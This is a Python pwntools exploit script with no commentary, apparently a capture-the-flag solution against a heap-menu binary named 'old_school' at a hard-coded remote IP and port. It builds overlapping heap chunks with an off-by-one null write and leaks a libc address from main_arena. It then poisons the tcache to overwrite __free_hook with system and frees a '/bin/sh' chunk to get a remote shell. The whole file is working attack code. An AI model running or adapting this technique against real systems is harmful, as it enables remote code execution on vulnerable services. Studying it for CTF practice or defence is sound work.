from pwn import *
context.log_level = 'debug'

def add(idx,size):
	p.recv()
	p.sendline('1')
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.sendline(str(size))

def edit(idx,con):
	p.recv()
	p.sendline('2')
	p.recv()
	p.sendline(str(idx))
	p.recv()
	p.sendline(con)

def show(idx):
	p.recv()
	p.sendline('3')
	p.recv()
	p.sendline(str(idx))
def dele(idx):
	p.recv()
	p.sendline('4')
	p.recv()
	p.sendline(str(idx))

#p = process("./old_school")
#libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=remote('121.36.194.21','49154')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

for i in range(10):
	add(i,0xf8)
for i in range(7,-1,-1):
	dele(i)
for i in range(7):
	add(i+1,0xf8)
edit(1,0xf0*'a'+p64(0x200)+'\x00')
for i in range(9,1,-1):
	dele(i)	
for i in range(7):
	add(i+3,0xf8)
add(0,0xf8)
show(1)

main_arean_96 = u64(p.recvuntil("\x7f")[-6::].ljust(8,'\x00'))
print "main_arean_96:",hex(main_arean_96)
libc_addr = main_arean_96-96-0x3ebc40
print "libc_addr:",hex(libc_addr)
free_hook = libc_addr + libc.sym['__free_hook']
system = libc_addr + libc.sym['system']

add(2,0xf8)
dele(2)
edit(1,p64(0)*2)
dele(2)
edit(1,p64(free_hook)*2)
add(10,0xf8)
add(11,0xf8)
edit(11,p64(system))
edit(1,"/bin/sh\x00\x00")

#gdb.attach(p)
#raw_input()

dele(1)

p.interactive()